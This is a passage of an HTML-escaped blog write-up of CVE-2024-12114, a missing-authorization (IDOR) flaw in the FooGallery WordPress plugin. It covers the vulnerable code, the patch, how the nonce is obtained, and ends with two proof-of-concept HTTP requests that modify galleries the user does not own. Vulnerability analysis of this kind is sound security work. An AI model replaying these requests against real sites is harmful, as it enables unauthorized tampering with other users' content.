&lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;According to the CVE description, the actual impact only occurs when the &lt;strong&gt;Gallery Creator role setting&lt;/strong&gt; is set &lt;strong&gt;lower than “Editor”&lt;/strong&gt;.&#xA;You can configure it here:&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/role.png&#34; title=&#34;Gallery Creator role&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/role.png&#34; data-sub-html=&#34;&lt;h2&gt;Role&lt;/h2&gt;&lt;p&gt;Gallery Creator role&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/role.png&#39; alt=&#34;Role&#34; height=&#34;882&#34; width=&#34;1382&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gallery Creator role&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;At that point, users with this role will be able to use the &lt;strong&gt;Add&lt;/strong&gt;/&lt;strong&gt;Edit&lt;/strong&gt; Gallery functionality:&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create.png&#34; title=&#34;Create/Add&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/create.png&#34; data-sub-html=&#34;&lt;h2&gt;Create/Add&lt;/h2&gt;&lt;p&gt;Create/Add&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create.png&#39; alt=&#34;Create/Add&#34; height=&#34;829&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Create/Add&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers an AJAX handler &lt;strong&gt;for logged-in users&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_foogallery_attachment_modal_save&amp;#39;, array( $this, &amp;#39;ajax_save_modal&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_&lt;/code&gt; is a hook for authenticated users (Subscriber+). When a request is sent to &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with the parameter &lt;code&gt;action=foogallery_attachment_modal_save&lt;/code&gt;, the callback &lt;code&gt;ajax_save_modal&lt;/code&gt; is executed:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function ajax_save_modal() {&#xA;    $foogallery = ( isset( $_POST[&amp;#39;foogallery&amp;#39;] ) ? $_POST[&amp;#39;foogallery&amp;#39;] : array() );&#xA;&#xA;    if ( !is_array( $foogallery ) || empty( $foogallery ) ) {&#xA;        return;&#xA;    }&#xA;&#xA;    // Check for nonce security      &#xA;    if ( ! wp_verify_nonce( $_POST[&amp;#39;nonce&amp;#39;], &amp;#39;foogallery-modal-nonce&amp;#39; ) ) {&#xA;        die ( &amp;#39;Busted!&amp;#39;);&#xA;    }&#xA;&#xA;    $img_id = intval( sanitize_text_field( $_POST[&amp;#39;img_id&amp;#39;] ) );&#xA;&#xA;    if ( $img_id &amp;gt; 0 ) {&#xA;        do_action( &amp;#39;foogallery_attachment_save_data&amp;#39;, $img_id, $foogallery );&#xA;    }&#xA;    &#xA;    wp_die();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function retrieves &lt;code&gt;foogallery&lt;/code&gt; from the request, checks whether it is a valid non-empty array, then verifies the nonce to ensure the request is valid:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wp_verify_nonce( $_POST[&amp;#39;nonce&amp;#39;], &amp;#39;foogallery-modal-nonce&amp;#39; ) ) {&#xA;    die ( &amp;#39;Busted!&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function &lt;code&gt;wp_verify_nonce()&lt;/code&gt; verifies whether the submitted &lt;code&gt;nonce&lt;/code&gt; is valid (generated by the &lt;code&gt;foogallery-modal-nonce&lt;/code&gt; action).&lt;/p&gt;&#xA;&lt;p&gt;If valid and &lt;code&gt;img_id &amp;gt; 0&lt;/code&gt;, &lt;code&gt;do_action(&#39;foogallery_attachment_save_data&#39;, ...)&lt;/code&gt; is executed with the provided &lt;code&gt;img_id&lt;/code&gt; and &lt;code&gt;foogallery&lt;/code&gt; data.&lt;/p&gt;&#xA;&lt;p&gt;Previously, the plugin registered a series of callbacks for the &lt;code&gt;foogallery_attachment_save_data&lt;/code&gt; action:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/add_action.png&#34; title=&#34;Registered callbacks for action foogallery_attachment_save_data&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/add_action.png&#34; data-sub-html=&#34;&lt;h2&gt;Add action&lt;/h2&gt;&lt;p&gt;Registered callbacks for action foogallery_attachment_save_data&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/add_action.png&#39; alt=&#34;Add action&#34; height=&#34;521&#34; width=&#34;1913&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Registered callbacks for action foogallery_attachment_save_data&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function foogallery_attachment_save_data_main( $img_id, $data ) {&#xA;&#xA;    if ( is_array( $data ) &amp;amp;&amp;amp; !empty( $data ) ) {&#xA;&#xA;        $foogallery_post = array(&#xA;            &amp;#39;ID&amp;#39; =&amp;gt; $img_id&#xA;        );&#xA;&#xA;        if ( array_key_exists( &amp;#39;title&amp;#39;, $data ) ) {&#xA;            $foogallery_post[&amp;#39;post_title&amp;#39;] = $data[&amp;#39;title&amp;#39;];&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;caption&amp;#39;, $data ) ) {&#xA;            $foogallery_post[&amp;#39;post_excerpt&amp;#39;] = $data[&amp;#39;caption&amp;#39;];&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;description&amp;#39;, $data ) ) {&#xA;            $foogallery_post[&amp;#39;post_content&amp;#39;] = $data[&amp;#39;description&amp;#39;];&#xA;        }&#xA;&#xA;        // Update post meta values&#xA;        if ( array_key_exists( &amp;#39;alt-text&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_wp_attachment_image_alt&amp;#39;, $data[&amp;#39;alt-text&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;custom-url&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foogallery_custom_url&amp;#39;, $data[&amp;#39;custom-url&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;custom-target&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foogallery_custom_target&amp;#39;, $data[&amp;#39;custom-target&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;custom-class&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foogallery_custom_class&amp;#39;, $data[&amp;#39;custom-class&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( is_array( $foogallery_post ) &amp;amp;&amp;amp; count( $foogallery_post ) &amp;gt; 1 ) {&#xA;            // Update the post into the database&#xA;            wp_update_post( $foogallery_post );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function foogallery_attachment_save_data_taxonomies( $img_id, $data ) {&#xA;    if ( is_array( $data ) &amp;amp;&amp;amp; !empty( $data ) ) {&#xA;&#xA;        if ( !$this-&amp;gt;attachments_have_taxonomies() ) {&#xA;            return;&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;taxonomies&amp;#39;, $data ) ) {&#xA;            foreach ( $data[&amp;#39;taxonomies&amp;#39;] as $taxonomy =&amp;gt; $taxonomy_value ) {&#xA;                $terms = explode( &amp;#39;,&amp;#39;, $taxonomy_value );&#xA;                if ( is_array( $terms ) ) {&#xA;                    $terms = array_map( &amp;#39;intval&amp;#39;, $terms );&#xA;                    wp_set_object_terms( $img_id, $terms, $taxonomy, false );&#xA;                }&#xA;            }&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function foogallery_attachment_save_data_thumbnails( $img_id, $data ) {&#xA;    if ( is_array( $data ) &amp;amp;&amp;amp; !empty( $data ) ) {&#xA;&#xA;        if ( array_key_exists( &amp;#39;crop_pos&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;foogallery_crop_pos&amp;#39;, $data[&amp;#39;crop_pos&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;override-thumbnail-id&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;foogallery_override_thumbnail&amp;#39;, $data[&amp;#39;override-thumbnail-id&amp;#39;] );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function foogallery_attachment_save_data_advanced($img_id, $data ) {&#xA;    if ( is_array( $data ) &amp;amp;&amp;amp; !empty( $data ) ) {&#xA;        if ( array_key_exists( &amp;#39;data-width&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_data-width&amp;#39;, $data[&amp;#39;data-width&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;data-height&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_data-height&amp;#39;, $data[&amp;#39;data-height&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;panning&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foobox_panning&amp;#39;, $data[&amp;#39;panning&amp;#39;] );&#xA;        }&#xA;&#xA;        if ( array_key_exists( &amp;#39;override_type&amp;#39;, $data ) ) {&#xA;            update_post_meta( $img_id, &amp;#39;_foogallery_override_type&amp;#39;, $data[&amp;#39;override_type&amp;#39;] );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;These callbacks perform a series of updates on the gallery corresponding to &lt;code&gt;img_id&lt;/code&gt;, with data fully controlled by the attacker.&lt;/p&gt;&#xA;&lt;p&gt;The IDOR vulnerability occurs because there is no restriction on the gallery corresponding to &lt;code&gt;img_id&lt;/code&gt;, allowing an attacker to arbitrarily modify galleries they do not own.&lt;/p&gt;&#xA;&lt;p&gt;The patch in &lt;code&gt;v2.4.30&lt;/code&gt; added the following restriction:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( current_user_can(&amp;#39;edit_post&amp;#39;, $img_id ) ) {&#xA;    do_action( &amp;#39;foogallery_attachment_save_data&amp;#39;, $img_id, $foogallery );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/patch.png&#34; title=&#34;Patch&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;Patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/patch.png&#39; alt=&#34;Patch&#34; height=&#34;470&#34; width=&#34;1814&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Only users with the &lt;code&gt;edit_post&lt;/code&gt; capability for the given &lt;code&gt;$img_id&lt;/code&gt; are allowed to trigger the &lt;code&gt;foogallery_attachment_save_data&lt;/code&gt; action to modify it.&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;A prerequisite is obtaining the nonce value corresponding to the &lt;code&gt;foogallery-modal-nonce&lt;/code&gt; action.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create_nonce.png&#34; title=&#34;Generating nonce with action foogallery-modal-nonce&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/create_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;Generating nonce with action foogallery-modal-nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create_nonce.png&#39; alt=&#34;Create nonce&#34; height=&#34;464&#34; width=&#34;1730&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Generating nonce with action foogallery-modal-nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The nonce is generated in the &lt;code&gt;build_modal_data()&lt;/code&gt; function via &lt;code&gt;wp_create_nonce( &#39;foogallery-modal-nonce&#39; )&lt;/code&gt; and only if two conditions are met:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$data&lt;/code&gt; is an array&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;img_id&lt;/code&gt; and &lt;code&gt;gallery_id&lt;/code&gt; are not &lt;code&gt;null&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;The &lt;code&gt;build_modal_data&lt;/code&gt; function returns an array that includes the &lt;code&gt;nonce&lt;/code&gt; value.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/embed_nonce.png&#34; title=&#34;Nonce value embedded into HTML&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/embed_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Embed nonce&lt;/h2&gt;&lt;p&gt;Nonce value embedded into HTML&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/embed_nonce.png&#39; alt=&#34;Embed nonce&#34; height=&#34;961&#34; width=&#34;1372&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce value embedded into HTML&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;This value is used by the &lt;code&gt;ajax_open_modal&lt;/code&gt; function, where the &lt;code&gt;nonce&lt;/code&gt; is embedded into the HTML form with ID &lt;code&gt;foogallery_attachment_modal_save_form&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Before that, &lt;code&gt;ajax_open_modal&lt;/code&gt; validates the nonce corresponding to the &lt;code&gt;foogallery_attachment_modal_open&lt;/code&gt; action:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wp_verify_nonce( $_POST[&amp;#39;nonce&amp;#39;], &amp;#39;foogallery_attachment_modal_open&amp;#39; ) ) {&#xA;    die ( &amp;#39;Busted!&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create_nonce1.png&#34; title=&#34;Generate nonce with action foogallery_attachment_modal_open&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/create_nonce1.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;Generate nonce with action foogallery_attachment_modal_open&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create_nonce1.png&#39; alt=&#34;Create nonce&#34; height=&#34;1067&#34; width=&#34;1918&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Generate nonce with action foogallery_attachment_modal_open&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;By reviewing the function logic, we see that the nonce is embedded into the HTML of the &lt;strong&gt;edit gallery&lt;/strong&gt; page.&lt;/p&gt;&#xA;&lt;p&gt;Use the &lt;strong&gt;edit gallery&lt;/strong&gt; functionality → intercept the request in BurpSuite → filter requests with the keyword &lt;code&gt;foogallery-image-edit-modal&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/data_nonce.png&#34; title=&#34;Nonce value during filtering&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/data_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Data nonce&lt;/h2&gt;&lt;p&gt;Nonce value during filtering&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/data_nonce.png&#39; alt=&#34;Data nonce&#34; height=&#34;532&#34; width=&#34;956&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce value during filtering&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;We can extract the nonce value from this request.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated User (Subscriber&amp;#43;)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Request admin-ajax.php?action=foogallery_attachment_modal_open&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Verify nonce: foogallery_attachment_modal_open&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Return HTML modal &amp;#43; embedded nonce (foogallery-modal-nonce)&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;User extracts nonce from response&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Send request: action=foogallery_attachment_modal_save&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Verify nonce: foogallery-modal-nonce&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;Extract img_id from request&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;No capability / ownership check (edit_post)&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;do_action(foogallery_attachment_save_data, img_id, data)&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;Update post / attachment data&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Unauthorized modification of arbitrary gallery/post (IDOR)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Perform an edit gallery action with a user that has the &lt;code&gt;Gallery Creator&lt;/code&gt; role&lt;/li&gt;&#xA;&lt;li&gt;Search for the keyword &lt;code&gt;foogallery-image-edit-modal&lt;/code&gt; and extract the nonce from the response&lt;/li&gt;&#xA;&lt;li&gt;Send a request to retrieve the nonce for the &lt;code&gt;foogallery_attachment_modal_save_form&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: valid_cookie&#xA;&#xA;action=foogallery_attachment_modal_open&amp;amp;nonce=9ad3ed3e9b&amp;amp;img_id=1&amp;amp;gallery_id=1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/get_nonce.png&#34; title=&#34;Get nonce from response&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/get_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Get nonce&lt;/h2&gt;&lt;p&gt;Get nonce from response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/get_nonce.png&#39; alt=&#34;Get nonce&#34; height=&#34;656&#34; width=&#34;954&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Get nonce from response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Send a request to modify data of any gallery&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: valid_cookie&#xA;&#xA;action=foogallery_attachment_modal_save&amp;amp;nonce=11bfc5f814&amp;amp;foogallery[]=any_data&amp;amp;img_id=1&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;&#xA;&lt;p&gt;Use UI to perform:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Truy cập &lt;code&gt;http://localhost/wp-admin/post.php?post=post_id&amp;amp;action=edit#&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Edit and save&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/edit.png&#34; title=&#34;Edit and save&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/edit.png&#34; data-sub-html=&#34;&lt;h2&gt;Edit&lt;/h2&gt;&lt;p&gt;Edit and save&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/edit.png&#39; alt=&#34;Edit&#34; height=&#34;1002&#34; width=&#34;1879&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Edit and save&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability occurs due to &lt;strong&gt;missing authorization checks&lt;/strong&gt; on &lt;code&gt;img_id&lt;/code&gt;.&#xA;Although a nonce check exists, the plugin still allows authenticated users to modify &lt;strong&gt;galleries they do not own&lt;/strong&gt;, resulting in an &lt;strong&gt;IDOR&lt;/strong&gt; 